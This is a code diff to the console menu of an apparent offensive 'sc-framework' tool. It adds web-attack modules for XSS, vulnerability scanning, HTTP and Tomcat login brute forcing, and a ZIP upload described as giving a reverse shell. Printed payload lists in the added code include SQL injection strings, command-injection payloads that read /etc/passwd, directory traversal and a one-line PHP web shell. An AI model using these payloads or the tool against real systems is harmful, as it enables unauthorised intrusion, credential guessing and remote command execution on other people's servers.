@@ -4,6 +4,7 @@
 
 import os
 import time
+import random
 from exploits import *
 from payloads import *
 
@@ -14,6 +15,8 @@ class color:
     white = '\033[0m'
     underline = '\033[4m'
     green = '\033[92m'
+    warning = '\033[93m'
+
 
 
 def start():
@@ -54,7 +57,7 @@ def start():
 
 
 def Menu():
-    print(color.blue + """
+    list = [color.blue + """
   ██████  ▄████▄  
 ▒██    ▒ ▒██▀ ▀█  
 ░ ▓██▄   ▒▓█    ▄ 
@@ -65,8 +68,7 @@ def Menu():
 ░  ░  ░  ░        
       ░  ░ ░      
          ░        
-""")
-    print("""
+
   █████▒██▀███   ▄▄▄       ███▄ ▄███▓▓█████  █     █░ ▒█████   ██▀███   ██ ▄█▀
 ▓██   ▒▓██ ▒ ██▒▒████▄    ▓██▒▀█▀ ██▒▓█   ▀ ▓█░ █ ░█░▒██▒  ██▒▓██ ▒ ██▒ ██▄█▒ 
 ▒████ ░▓██ ░▄█ ▒▒██  ▀█▄  ▓██    ▓██░▒███   ▒█░ █ ░█ ▒██░  ██▒▓██ ░▄█ ▒▓███▄░ 
@@ -76,9 +78,54 @@ def Menu():
  ░       ░▒ ░ ▒░  ▒   ▒▒ ░░  ░      ░ ░ ░  ░  ▒ ░ ░    ░ ▒ ▒░   ░▒ ░ ▒░░ ░▒ ▒░
  ░ ░     ░░   ░   ░   ▒   ░      ░      ░     ░   ░  ░ ░ ░ ▒    ░░   ░ ░ ░░ ░ 
           ░           ░  ░       ░      ░  ░    ░        ░ ░     ░     ░  ░   
-""" + color.white)
+""",
+color.red + """
+ ▄▀▀▀▀▄  ▄▀▄▄▄▄  
+█ █   ▐ █ █    ▌ 
+   ▀▄   ▐ █      
+▀▄   █    █      
+ █▀▀▀    ▄▀▄▄▄▄▀ 
+ ▐      █     ▐  
+        ▐        
+
+ ▄▀▀▀█▄    ▄▀▀▄▀▀▀▄  ▄▀▀█▄   ▄▀▀▄ ▄▀▄  ▄▀▀█▄▄▄▄  ▄▀▀▄    ▄▀▀▄  ▄▀▀▀▀▄   ▄▀▀▄▀▀▀▄  ▄▀▀▄ █ 
+█  ▄▀  ▀▄ █   █   █ ▐ ▄▀ ▀▄ █  █ ▀  █ ▐  ▄▀   ▐ █   █    ▐  █ █      █ █   █   █ █  █ ▄▀ 
+▐ █▄▄▄▄   ▐  █▀▀█▀    █▄▄▄█ ▐  █    █   █▄▄▄▄▄  ▐  █        █ █      █ ▐  █▀▀█▀  ▐  █▀▄  
+ █    ▐    ▄▀    █   ▄▀   █   █    █    █    ▌    █   ▄    █  ▀▄    ▄▀  ▄▀    █    █   █ 
+ █        █     █   █   ▄▀  ▄▀   ▄▀    ▄▀▄▄▄▄      ▀▄▀ ▀▄ ▄▀    ▀▀▀▀   █     █   ▄▀   █  
+█         ▐     ▐   ▐   ▐   █    █     █    ▐            ▀             ▐     ▐   █    ▐  
+▐                           ▐    ▐     ▐                                         ▐       
+""",
+color.green + """
+              ┬                                    ┬
+              │────────────────────────────────────│
+              o                                    o
+              ┬              ┌─┐┌─┐                ┬
+              │              └─┐│                  │
+              o              └─┘└─┘                o
+              ┬    ┌─┐┬─┐┌─┐┌┬┐┌─┐┬ ┬┌─┐┬─┐┬┌─     ┬ 
+              │    ├┤ ├┬┘├─┤│││├┤ ││││ │├┬┘├┴┐     │ 
+              o    └  ┴└─┴ ┴┴ ┴└─┘└┴┘└─┘┴└─┴ ┴     o 
+              ┬                                    ┬
+              │────────────────────────────────────│
+              o                                    o
+""",
+color.warning + """
+                    .▄▄ ·  ▄▄·                                 
+                    ▐█ ▀. ▐█ ▌▪                                
+                    ▄▀▀▀█▄██ ▄▄                                
+                    ▐█▄▪▐█▐███▌                                
+                     ▀▀▀▀ ·▀▀▀                                 
+    ·▄▄▄▄▄▄   ▄▄▄· • ▌ ▄ ·. ▄▄▄ .▄▄▌ ▐ ▄▌      ▄▄▄  ▄ •▄       
+    ▐▄▄·▀▄ █·▐█ ▀█ ·██ ▐███▪▀▄.▀·██· █▌▐█▪     ▀▄ █·█▌▄▌▪      
+    ██▪ ▐▀▀▄ ▄█▀▀█ ▐█ ▌▐▌▐█·▐▀▀▪▄██▪▐█▐▐▌ ▄█▀▄ ▐▀▀▄ ▐▀▀▄·      
+    ██▌.▐█•█▌▐█ ▪▐▌██ ██▌▐█▌▐█▄▄▌▐█▌██▐█▌▐█▌.▐▌▐█•█▌▐█.█▌      
+    ▀▀▀ .▀  ▀ ▀  ▀ ▀▀  █▪▀▀▀ ▀▀▀  ▀▀▀▀ ▀▪ ▀█▄▀▪.▀  ▀·▀  ▀      
+"""]
+    random_banner = random.choice(list)
+    print(random_banner)
     print()
-    print("you can use some of the tools from: ",os.getcwd(),"/tools/")
+    print(color.white + "you can use some of the tools from: ",os.getcwd(),"/tools/")
     print()
     print("to see help menu type 'help' to see the " + color.underline + color.green + "scconsole" + color.white + " commands.")
     print("when you choose a exploit, you will type the options when you run the exploit!")
@@ -93,14 +140,29 @@ def Console():
 help ---> to see this help menu.
 clear ---> to clear the screen.
 use <exploit> ---> to use the exploit.
-search exploit ---> to search and show all exploits.
-search windows --> to search and show all windows exploits.
+search ---> to see the search options.
 exit ---> to exit from sc-console.
 show payloads ---> to see avalable payloads in sc-framework.
 use system commands ---> to use system tools and commands 3 times, to come back here use (back to sc-console).
 """)
+    elif scconsole == "h":
+        print("""
+help ---> to see the full help menu.
+clear ---> to clear the screen.
+search ---> to see the search options.
+exit ---> to exit from sc-console.
+use system commands ---> to use system tools and commands 3 times, to come back here use (back to sc-console).
+""")
+    elif scconsole == "show options":
+        print("""
+PLEASE CHOOSE AN EXPLOIT THEN TYPE THIS!
+""")
     elif scconsole == "clear":
         os.system('clear')
+    elif scconsole == "search":
+        print("""
+search <exploit | windows | site>        
+""")
     elif scconsole == "search exploits":
         print("""
     Exploits                         When created?        Discrepstion 
@@ -151,6 +213,16 @@ windows/ftp-login-test               24/01/19 11:15       for login on port 21 o
 windows/java-rhino                   24/01/12 02:45       for excuteshellcommand http port.
 windows/ms17-010-psexec              24/01/13 08:20       for brute force windows smb port.
 windows/ssh-login-test               24/01/11 05:54       for brute forcing ssh port.
+""")
+    elif scconsole == "search site":
+        print("""
+    Exploits                         When created?        Discrepstion 
+site/XSS                          24/01/14 09:35       for alert the XSS attack in html file.
+site/find_vulnerabilites_website  24/01/14 11:40       for finding vulnerabilite in the target website.
+site/find-vulnerabilites-website2 24/01/14 12:31       for finding vulnerabilite with payload you specified.
+site/http-login-test              24/01/19 12:01       for login on port 80 http port.
+site/ZIP-exploit                  24/01/16 01:49       for genrate a zip file, then send the zip file to your target website, when unziped, you geted reverse shell.
+site/tomcat-mgr-login             24/01/12 04:23       for brute force login pages.
 """)
     elif scconsole == "show payloads":
         print("""
@@ -258,7 +330,35 @@ windows/ssh-login-test               24/01/11 05:54       for brute forcing ssh 
         time.sleep(0.5)
         wexploitftplogintest()
         print("using windows/ftp-login-test.")
+    elif scconsole == "use site/XSS":
+        time.sleep(0.5)
+        texploitXSS()
+        print("using site/XSS.")
+    elif scconsole == "use site/find_vulnerabilites_website":
+        time.sleep(0.5)
+        texploitfindvulnerabiliteswebsite()
+        print("using site/find_vulnerabilites_website.")
+    elif scconsole == "use site/find-vulnerabilites-website2":
+        time.sleep(0.5)
+        texploitfindvulnerabiliteswebsite2()
+        print("using site/find-vulnerabilites-website2.")
+    elif scconsole == "use site/http-login-test":
+        time.sleep(0.5)
+        texploithttplogintest()
+        print("using site/http-login-test.")
+    elif scconsole == "use site/ZIP-exploit":
+        time.sleep(0.5)
+        texploitZIPexploit()
+        print("using site/ZIP-exploit.")
+    elif scconsole == "use site/tomcat-mgr-login":
+        time.sleep(0.5)
+        texploittomcatmgrlogin()
+        print("using site/tomcat-mgr-login.")
     elif scconsole == "use system commands":
+            OSconsole()
+            OSconsole()
+            OSconsole()
+    elif scconsole == "use system command":
             OSconsole()
             OSconsole()
             OSconsole()
@@ -1157,6 +1257,282 @@ you will specifiy these options when you run or exploit it!
         time.sleep(0.5)
         Console()
     elif scconsole23 == "exit":
+        exit()
+
+def texploitXSS():
+    scconsole24 = input("sc~" + color.red + "(site/XSS)" + color.white + ">")
+    if scconsole24 == "help":
+        print("""
+help ---> to see this help menu.
+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+""")
+        texploitXSS()
+    elif scconsole24 == "clear":
+        os.system('clear')
+        texploitXSS()
+    elif scconsole24 == "show options":
+        print("""
+NO OPTION OR DISCREPTIONS HERE!
+
+this is not exploit, this for try the payload!
+payload = <img src=x onerror=alert('XSS')>  ---> cross site XSS onerror payload.
+""")
+        texploitXSS()
+    elif scconsole24 == "run":
+        os.system('firefox exploits/site/XSS.html')
+        texploitXSS()
+    elif scconsole24 == "exploit":
+        os.system('firefox exploits/site/XSS.html')
+        texploitXSS()
+    elif scconsole24 == "unuse":
+        print("unusing site/XSS.")
+        time.sleep(0.5)
+        Console()
+    elif scconsole24 == "exit":
+        exit()
+
+def texploitfindvulnerabiliteswebsite():
+    scconsole25 = input("sc~" + color.red + "(site/find-vulnerabilites-website)" + color.white + ">")
+    if scconsole25 == "help":
+        print("""
+help ---> to see this help menu.
+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+show payloads ---> to see avalable payloads in sc-framework.
+""")
+        texploitfindvulnerabiliteswebsite()
+    elif scconsole25 == "clear":
+        os.system('clear')
+        texploitfindvulnerabiliteswebsite()
+    elif scconsole25 == "show options":
+        print("""
+OPTIONS          | DISCREPTIONS
+-----------------|----------------------
+LHOST            | specifiy the target ip address.
+PAYLOAD          | specifiy the payload you want.
+
+please copy the payload you want by typing (show payloads)!
+you will specifiy these options when you run or exploit it!
+""")
+        texploitfindvulnerabiliteswebsite()
+    elif scconsole25 == "show payloads":
+        print("""
+' OR 1=1--   ---> SQL Injection payload.
+
+' UNION SELECT NULL,NULL,NULL--  ---> SQL Injection union payload.
+
+<script>alert('XSS')</script>  ---> cross site XSS alert payload.
+
+<img src=x onerror=alert('XSS')>  ---> cross site XSS onerror payload.
+
+;whoami  ---> remote code execute whoami payload.
+
+;cat /etc/passwd  ---> remote code execute cat payload.
+
+../../../../etc/passwd  ---> directory traversal etc/passwd payload.
+
+<?php system($_GET['cmd']); ?>  ---> directory traversal php payload.
+""")
+        texploitfindvulnerabiliteswebsite()
+    elif scconsole25 == "run":
+        os.system('python exploits/site/find_vulnerabilites_website.py')
+        texploitfindvulnerabiliteswebsite()
+    elif scconsole25 == "exploit":
+        os.system('python exploits/site/find_vulnerabilites_website.py')
+        texploitfindvulnerabiliteswebsite()
+    elif scconsole25 == "unuse":
+        print("unusing site/find_vulnerabilites_website.")
+        time.sleep(0.5)
+        Console()
+    elif scconsole25 == "exit":
+        exit()
+
+def texploitfindvulnerabiliteswebsite2():
+    scconsole26 = input("sc~" + color.red + "(site/find-vulnerabilites-website2)" + color.white + ">")
+    if scconsole26 == "help":
+        print("""
+help ---> to see this help menu.
+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+show payloads ---> to see avalable payloads in sc-framework.
+""")
+        texploitfindvulnerabiliteswebsite2()
+    elif scconsole26 == "clear":
+        os.system('clear')
+        texploitfindvulnerabiliteswebsite2()
+    elif scconsole26 == "show options":
+        print("""
+OPTIONS          | DISCREPTIONS
+-----------------|----------------------
+LHOST            | specifiy the target ip address.
+PAYLOAD          | specifiy the payload you want.
+
+please copy the payload you want by typing (show payloads)!
+you will specifiy these options when you run or exploit it!
+""")
+        texploitfindvulnerabiliteswebsite2()
+    elif scconsole26 == "show payloads":
+        print("""
+' OR 1=1--   ---> SQL Injection payload.
+
+' UNION SELECT NULL,NULL,NULL--  ---> SQL Injection union payload.
+
+<script>alert('XSS')</script>  ---> cross site XSS alert payload.
+
+<img src=x onerror=alert('XSS')>  ---> cross site XSS onerror payload.
+
+;whoami  ---> remote code execute whoami payload.
+
+;cat /etc/passwd  ---> remote code execute cat payload.
+
+../../../../etc/passwd  ---> directory traversal etc/passwd payload.
+
+<?php system($_GET['cmd']); ?>  ---> directory traversal php payload.
+""")
+        texploitfindvulnerabiliteswebsite2()
+    elif scconsole26 == "run":
+        os.system('python exploits/site/find-vulnerabilites-website2.py')
+        texploitfindvulnerabiliteswebsite2()
+    elif scconsole26 == "exploit":
+        os.system('python exploits/site/find-vulnerabilites-website2.py')
+        texploitfindvulnerabiliteswebsite2()
+    elif scconsole26 == "unuse":
+        print("unusing site/find-vulnerabilites-website2.")
+        time.sleep(0.5)
+        Console()
+    elif scconsole26 == "exit":
+        exit()
+
+def texploithttplogintest():
+    scconsole27 = input("sc~" + color.red + "(site/http-login-test)" + color.white + ">")
+    if scconsole27 == "help":
+        print("""
+help ---> to see this help menu.
+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+""")
+        texploithttplogintest()
+    elif scconsole27 == "clear":
+        os.system('clear')
+        texploithttplogintest()
+    elif scconsole27 == "show options":
+        print("""
+OPTIONS          | DISCREPTIONS
+-----------------|----------------------
+LHOST            | specifiy the target ip address.
+USERNAMELIST     | specifiy the username list.
+PASSLIST         | specifiy the password list.
+
+you will specifiy these options when you run or exploit it!
+""")
+        texploithttplogintest()
+    elif scconsole27 == "run":
+        os.system('python exploits/site/http-login-test.py')
+        texploithttplogintest()
+    elif scconsole27 == "exploit":
+        os.system('python exploits/site/http-login-test.py')
+        texploithttplogintest()
+    elif scconsole27 == "unuse":
+        print("unusing site/http-login-test.")
+        time.sleep(0.5)
+        Console()
+    elif scconsole27 == "exit":
+        exit()
+
+def texploitZIPexploit():
+    scconsole28 = input("sc~" + color.red + "(site/ZIP-exploit)" + color.white + ">")
+    if scconsole28 == "help":
+        print("""
+help ---> to see this help menu.
+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+""")
+        texploitZIPexploit()
+    elif scconsole28 == "clear":
+        os.system('clear')
+        texploitZIPexploit()
+    elif scconsole28 == "show options":
+        print("""
+OPTIONS          | DISCREPTIONS
+-----------------|----------------------
+URL              | specifiy the target url to upload zip file.
+
+you will specifiy these options when you run or exploit it!
+""")
+        texploitZIPexploit()
+    elif scconsole28 == "run":
+        os.system('python exploits/site/ZIP-exploit.py')
+        texploitZIPexploit()
+    elif scconsole28 == "exploit":
+        os.system('python exploits/site/ZIP-exploit.py')
+        texploitZIPexploit()
+    elif scconsole28 == "unuse":
+        print("unusing site/ZIP-exploit.")
+        time.sleep(0.5)
+        Console()
+    elif scconsole28 == "exit":
+        exit()
+
+def texploittomcatmgrlogin():
+    scconsole29 = input("sc~" + color.red + "(site/tomcat-mgr-login)" + color.white + ">")
+    if scconsole29 == "help":
+        print("""
+help ---> to see this help menu.
+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+""")
+        texploittomcatmgrlogin()
+    elif scconsole29 == "clear":
+        os.system('clear')
+        texploittomcatmgrlogin()
+    elif scconsole29 == "show options":
+        print("""
+OPTIONS          | DISCREPTIONS
+-----------------|----------------------
+LHOST            | specifiy the target url.
+USERNAMELIST     | specifiy the username list.
+PASSLIST         | specifiy the password list.
+BRUTEFORCE-SPEED | specifiy the brute force speed.
+
+you will specifiy these options when you run or exploit it!
+""")
+        texploittomcatmgrlogin()
+    elif scconsole29 == "run":
+        os.system('python exploits/site/tomcat-mgr-login.py')
+        texploittomcatmgrlogin()
+    elif scconsole29 == "exploit":
+        os.system('python exploits/site/tomcat-mgr-login.py')
+        texploittomcatmgrlogin()
+    elif scconsole29 == "unuse":
+        print("unusing site/tomcat-mgr-login.")
+        time.sleep(0.5)
+        Console()
+    elif scconsole29 == "exit":
         exit()
 
 def OSconsole():
